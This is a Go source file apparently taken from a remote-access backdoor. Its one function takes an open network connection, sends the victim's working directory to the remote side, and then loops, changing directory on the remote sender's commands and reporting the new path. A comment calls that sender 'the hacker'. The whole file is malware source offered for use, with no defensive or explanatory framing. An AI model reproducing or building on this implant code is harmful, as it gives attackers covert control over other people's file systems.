package Move

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func NavigateFileSystem(connection net.Conn) (err error) {
	pwd, err := os.Getwd()
	if err != nil {
		//fmt.Println("[-] Can't get present directory")
	}
	fmt.Println(pwd)

	pwd_raw := pwd + "\n"
	nbyte, err := connection.Write([]byte(pwd_raw))
	if nbyte == nbyte {
	}
	//fmt.Println("[+] ", nbyte, " was written")

	CommandReader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {
		user_command_raw, err := CommandReader.ReadString('\n')

		if err != nil {
			//fmt.Println("[-] Unable to read command")
		}

		if user_command_raw == "stop\n" {
			loopControl = false
			break
		}
		user_command := strings.TrimSuffix(user_command_raw, "\n")
		// cd ..
		// [cd, ..]
		// cd
		user_commnad_arr := strings.Split(user_command, " ")
		//println(user_commnad_arr)

		if len(user_commnad_arr) > 1 {
			dir2move := user_commnad_arr[1]
			println(user_commnad_arr[1])
			err = os.Chdir(dir2move)
			if err != nil {
				//fmt.Println("[-] Unable to change directory")
			}
		}

		pwd, err = os.Getwd()
		nbytes, err := connection.Write([]byte(pwd + "\n"))
		if nbytes == nbytes {
		}
		//fmt.Println("[+] Pwd written to the hacker, ", nbytes)
	}
	return
}
